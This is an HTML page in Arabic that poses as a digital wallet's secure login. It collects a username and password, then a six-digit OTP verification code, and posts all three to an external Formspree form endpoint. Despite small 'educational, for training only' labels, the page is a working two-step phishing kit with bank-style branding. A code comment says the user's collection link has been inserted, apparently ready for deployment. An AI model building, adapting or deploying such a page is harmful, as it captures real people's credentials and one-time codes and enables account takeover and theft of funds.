<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق محفظتي الرقمية التعليمي</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #4a148c 0%, #c2185b 50%, #ffffff 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .wallet-card {
            background: rgba(255, 255, 255, 0.98);
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            width: 320px;
            text-align: center;
        }
        .bank-logo {
            width: 65px;
            height: 65px;
            background: linear-gradient(45deg, #4a148c, #c2185b);
            border-radius: 18px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            margin: 0 auto 15px auto;
        }
        .bank-name {
            font-size: 18px;
            font-weight: bold;
            color: #4a148c;
            margin: 0 0 25px 0;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 12px;
            color: #4a148c;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 14px;
            box-sizing: border-box;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            background-color: #fafafa;
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #4a148c, #c2185b);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="wallet-card">
    <div class="bank-logo">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <rect x="2" y="5" width="20" height="14" rx="2"></rect>
            <line x1="2" y1="10" x2="22" y2="10"></line>
        </svg>
    </div>
    <div class="bank-name">محفظتي التعليمية الافتراضية</div>

    <!-- تم وضع رابط Formspree الخاص بك هنا مباشرة وبشكل صحيح -->
    <form action="https://formspree.io/f/meaewvar" method="POST" id="mainForm">
        
        <!-- الواجهة الأولى: تسجيل الدخول -->
        <div id="step1">
            <h3>تسجيل الدخول الآمن</h3>
            <p style="color:#757575; font-size:13px;">نموذج تجريبي لأغراض التعليم والتدريب فقط</p>
            
            <div class="input-group">
                <label>اسم المستخدم التخيلي</label>
                <input type="text" name="username" id="username" placeholder="أدخل اسم المستخدم...">
            </div>
            
            <div class="input-group">
                <label>كلمة المرور الافتراضية</label>
                <input type="password" name="password" id="password" placeholder="••••••••">
            </div>
            
            <button type="button" class="btn-submit" onclick="nextStep()">موافق</button>
        </div>

        <!-- الواجهة الثانية: إدخال الكود -->
        <div id="step2" class="hidden">
            <h3>رمز الأمان الافتراضي</h3>
            <p style="color:#757575; font-size:13px;">أدخل أي رمز تجريبي مكوّن من 6 أرقام لاختبار الإرسال</p>
            
            <div class="input-group">
                <label style="text-align: center;">كود التحقق (OTP)</label>
                <input type="text" name="authCode" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
            </div>
            
            <button type="submit" class="btn-submit">تأكيد الرمز والإرسال</button>
        </div>
        
    </form>
</div>

<script>
    function nextStep() {
        var user = document.getElementById('username').value;
        var pass = document.getElementById('password').value;
        
        if(user === "" || pass === "") {
            alert("خطأ: يرجى ملء حقول تسجيل الدخول أولاً!");
            return;
        }
        
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
    }
</script>

</body>
</html>
